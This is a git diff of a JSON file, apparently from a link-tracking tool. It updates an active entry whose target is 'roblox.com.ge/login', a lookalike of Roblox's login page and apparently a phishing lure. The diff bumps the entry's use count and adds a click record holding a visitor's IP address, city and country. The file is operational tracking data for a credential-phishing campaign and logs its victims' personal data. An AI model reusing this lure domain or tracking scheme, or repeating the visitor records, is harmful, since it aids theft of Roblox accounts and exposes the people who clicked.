@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1504,
+    "useCount": 1505,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12200,6 +12200,14 @@
         "city": "Silang",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777444510373,
+        "ip": "172.56.218.252",
+        "country": "United States",
+        "city": "Philadelphia",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
